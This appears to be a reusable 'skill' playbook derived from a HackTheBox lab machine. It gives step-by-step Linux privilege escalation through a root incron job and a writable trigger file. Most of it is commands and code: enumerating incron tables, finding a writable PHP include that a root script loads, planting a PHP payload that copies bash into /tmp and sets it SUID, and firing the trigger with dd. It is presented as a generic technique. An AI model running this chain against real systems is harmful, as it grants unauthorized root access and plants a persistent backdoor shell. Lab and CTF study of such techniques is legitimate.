# Skill: root incrond job -> writable trigger -> root include hijack

From: HTB Connected (FreePBX/Sangoma). Trigger: Linux box, low-priv shell.

## 1. Enumerate root incron jobs (cheap, no sudo)

```bash
ps aux | grep -i incron          # confirm root incrond (Uid 0 in /proc/<pid>/status)
cat /etc/incron.d/* 2>/dev/null   # system tables -> commands run as ROOT
ls -la /var/spool/incron/         # per-user tables (run as that user)
incrontab -l 2>/dev/null
```

Each line: `<watched-path> <MASK> <command>`. `IN_CLOSE_WRITE` = fires when a
file that was opened for writing is closed.

## 2. Find a trigger the current user can write

For each watched path, `ls -la` it and the root command it calls. Look for a
world-writable / user-owned trigger, then read the root script it invokes and
find any file *it* loads that is writable by you:

```bash
# example: /usr/local/asterisk/ha_trigger (777 asterisk) -> /usr/sbin/sysadmin_ha
cat /usr/sbin/sysadmin_ha
# -> require_once("/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php")
#    then: $incron = new incron; $incron->rootTrigger();
ls -la /var/www/html/admin/modules/            # writable by service user? -> hijack
```

Plant the expected symbol with a payload:

```php
<?php
class incron { public function rootTrigger(){
  @system("id > /tmp/pwn; /usr/bin/cp /bin/bash /tmp/rb; /usr/bin/chmod 4755 /tmp/rb");
}}
```

## 3. Fire the job — GOTCHA: actually write, don't `touch`

```bash
# touch (utimensat) and often `echo >>` DO NOT raise IN_CLOSE_WRITE here.
# Use a real open-for-write + close:
dd if=/dev/zero bs=1 count=1 of=/usr/local/asterisk/ha_trigger conv=notrunc 2>/dev/null
sleep 3; cat /tmp/pwn        # uid=0(root)
```

If the first write "does nothing", the job IS loaded but your write didn't
generate the event — retry with `dd conv=notrunc`, `printf x > file`, or a
python `open(path,'w').write('x')`. Re-check `ls -la` to confirm mtime moved.

## Notes
- Verified on Sangoma Linux 7.8 / kernel 5.4.239 — no SUID/sudo needed.
- Root incrond system tables live in `/etc/incron.d` (default `system_table_dir`);
  commands there always run as root.
- Drop a SUID bash for a stable root shell; remember to clean up payloads.
